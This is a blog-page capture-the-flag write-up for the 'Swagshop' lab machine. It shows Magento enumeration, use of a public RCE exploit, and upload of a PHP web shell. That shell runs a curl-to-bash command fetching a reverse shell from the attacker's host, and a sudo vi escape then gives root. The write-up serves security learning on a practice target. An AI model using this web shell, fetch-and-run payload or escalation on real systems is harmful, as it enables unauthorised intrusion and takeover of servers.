@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CentHack | Welcome to my blog!!</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CentHack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Welcome to my blog!!" />
+<meta property="og:description" content="Welcome to my blog!!" />
+<link rel="canonical" href="http://localhost:4000/pages/writeups/swagshop.html" />
+<meta property="og:url" content="http://localhost:4000/pages/writeups/swagshop.html" />
+<meta property="og:site_name" content="CentHack" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CentHack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Welcome to my blog!!","headline":"CentHack","url":"http://localhost:4000/pages/writeups/swagshop.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CentHack</h1>
+        </a>
+        <h2>Welcome to my blog!!</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="swagshop">Swagshop</h1>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>IP → 10.10.10.140</p>
+
+<p>Port scan reported the following opened ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+</code></pre></div></div>
+
+<h3 id="port-80">Port 80</h3>
+
+<p>In the HTTP headers we find a  domain name.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/swagshop]
+└─<span class="nv">$ </span>curl <span class="nt">-I</span> 10.10.10.140                                                                                                       
+HTTP/1.1 302 Found
+Date: Sun, 19 Nov 2023 10:55:00 GMT
+Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Location: http://swagshop.htb/
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/swagshop]
+└─<span class="nv">$ </span>whatweb 10.10.10.140                            
+http://10.10.10.140 <span class="o">[</span>302 Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.140], RedirectLocation[http://swagshop.htb/]
+http://swagshop.htb/ <span class="o">[</span>200 OK] Apache[2.4.29], Cookies[frontend], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, HttpOnly[frontend], IP[10.10.10.140], JQuery[1.10.2], Magento, Modernizr, Prototype, Script[text/javascript], Scriptaculous, Title[Home page], X-Frame-Options[SAMEORIGIN]
+</code></pre></div></div>
+
+<p>Since we have a domain we can perform a <strong>subdomain enumeration</strong>.</p>
+
+<p>In the page we can many possible attacks:</p>
+
+<ul>
+  <li>Attacking the cookies</li>
+  <li>Attacking the products ID.</li>
+  <li>Search an exploit for magento CMS</li>
+</ul>
+
+<p>Directory enumeration:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-r</span> <span class="nt">-w</span> ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">--url</span> http://10.10.10.140
+<span class="o">===============================================================</span>
+Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/api                  <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1698]
+/media                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1917]
+/includes             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 946]
+/lib                  <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2877]
+/app                  <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1698]
+/shell                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1547]
+/skin                 <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1331]
+/var                  <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2097]
+/errors               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2149]
+/mage                 <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1319]
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+</code></pre></div></div>
+
+<p>Listing PHP files:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>wfuzz <span class="nt">--hc</span> 404 <span class="nt">-w</span> ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://swagshop.htb/FUZZ.php                                                                        
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
+<span class="o">=====================================================================</span>
+
+000000002:   200        327 L    904 W      16593 Ch    <span class="s2">"index"</span>                                                                                                                                                                    
+000000702:   200        3 L      6 W        44 Ch       <span class="s2">"install"</span>                                                                                                                                                                  
+000001013:   200        0 L      4 W        37 Ch       <span class="s2">"api"</span>                                                                                                                                                                      
+000002410:   200        0 L      0 W        0 Ch        <span class="s2">"cron"</span>
+</code></pre></div></div>
+
+<p>Since this is a CMS, in unlikely we find a vulnerability ourselves, so there must be available exploits.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/swagshop/exploits]
+└─<span class="nv">$ </span>searchsploit magento                
+<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                                                                                                                            |  Path
+<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                                                                                                              | php/webapps/38573.txt
+eBay Magento CE 1.9.2.1 - Unrestricted Cron Script <span class="o">(</span>Code Execution / Denial of Service<span class="o">)</span>                                                                                                                   | php/webapps/38651.txt
+Magento 1.2 - <span class="s1">'/app/code/core/Mage/Admin/Model/Session.php?login['</span>Username<span class="s1">']'</span> Cross-Site Scripting                                                                                                        | php/webapps/32808.txt
+Magento 1.2 - <span class="s1">'/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email'</span> Cross-Site Scripting                                                                                                  | php/webapps/32809.txt
+Magento 1.2 - <span class="s1">'downloader/index.php'</span> Cross-Site Scripting                                                                                                                                                 | php/webapps/32810.txt
+Magento &lt; 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                                                                                                            | php/webapps/39838.php
+Magento CE &lt; 1.9.0.1 - <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code Execution                                                                                                                                              | php/webapps/37811.py
+Magento eCommerce - Local File Disclosure                                                                                                                                                                 | php/webapps/19793.txt
+Magento eCommerce - Remote Code Execution                                                                                                                                                                 | xml/webapps/37977.py
+Magento eCommerce CE v2.3.5-p2 - Blind SQLi                                                                                                                                                               | php/webapps/50896.txt
+Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                                                                                                                    | php/webapps/35996.txt
+Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                                                                                                               | php/webapps/35052.txt
+Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass                                                                                                                              | php/webapps/48135.php
+<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+</code></pre></div></div>
+
+<p>The first one we will use is <code class="language-plaintext highlighter-rouge">Magento eCommerce - Remote Code Execution | xml/webapps/37977.py</code> .</p>
+
+<p>Making a proper changes to the script, we will have admin access to the adminstration panel of Magento.</p>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>Now searching in the internet we find that there is a way to upload custom phtml files to the server. This basically means that we can execute php code in the server. The article that explains this is this one <a href="https://blog.scrt.ch/2019/01/24/magento-rce-local-file-read-with-low-privilege-admin-rights/">https://blog.scrt.ch/2019/01/24/magento-rce-local-file-read-with-low-privilege-admin-rights/</a>. We will do as follows:</p>
+
+<ul>
+  <li>Modificate an existing product to have  a <code class="language-plaintext highlighter-rouge">Custom Option</code> of type <code class="language-plaintext highlighter-rouge">File</code> with <code class="language-plaintext highlighter-rouge">phtml</code> as valid extension.</li>
+  <li>We save the changes and add this modify product to our cart, uploading our phtml file.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+
+phpinfo<span class="o">()</span><span class="p">;</span>
+
+system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span> 
+
+?&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>We go to this route <code class="language-plaintext highlighter-rouge">/media/custom_options/quote/</code> and find our uploaded file. The name will be a md5 hash. Upon opening the file we should see the <code class="language-plaintext highlighter-rouge">phpinfo</code> and we can execute commands with parameter <code class="language-plaintext highlighter-rouge">cmd</code> in the url.</li>
+</ul>
+
+<p>If we send the following payload we should receive a reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://swagshop.htb/media/custom_options/quote/s/p/fc6cd7e927e8f628a58e13970b9ba8e6.phtml?cmd<span class="o">=</span>curl%2010.10.14.11/shell.sh%20|%20bash
+</code></pre></div></div>
+
+<p>And we do.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.11] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.140] 56572
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1668<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@swagshop:/var/www/html/media/custom_options/quote/s/p<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>www-data
+www-data@swagshop:/var/www/html/media/custom_options/quote/s/p<span class="err">$</span>
+</code></pre></div></div>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<p>Basic enumeration lead us toknow that user ww-data can execute one sudo command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@swagshop:/var/www/html<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>www-data on swagshop:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User www-data may run the following commands on swagshop:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/vi /var/www/html/<span class="k">*</span>
+</code></pre></div></div>
+
+<p>To exploit this we simply execute vi</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> root /usr/bin/vi /var/www/html/install.php
+</code></pre></div></div>
+
+<p>And execute <code class="language-plaintext highlighter-rouge">:shell</code> from vi CLI. That will gives us a shell as root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@swagshop:/var/www/html# <span class="nb">whoami
+</span>root
+root@swagshop:/var/www/html# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
